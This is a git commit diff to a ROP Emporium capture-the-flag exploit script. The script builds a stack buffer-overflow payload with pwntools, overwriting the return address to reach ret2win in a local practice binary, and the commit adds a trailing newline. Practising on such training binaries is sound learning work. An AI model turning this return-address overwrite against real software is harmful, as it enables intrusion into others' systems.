2c3248596fd782dfc8e42eeef9daf40aec4336ed
Clif Wolfe <clifwolfe1@gmail.com>
2019-03-20 12:00:59 -0400

    Updated ret2win32 to make it not as bad, again

--- rop_emporium/ret2win_ex.py
+++ rop_emporium/ret2win_ex.py
@@ -5,6 +5,7 @@ ret2win_addr = 0x08048659
 payload = ('D'*40).encode()
 payload += ('B'*4).encode()
 payload += pwn.p32(ret2win_addr)
+payload += "\n".encode()
 
 p = pwn.tubes.process.process(["./ret2win32"], shell=True)
 p.send_raw(payload)
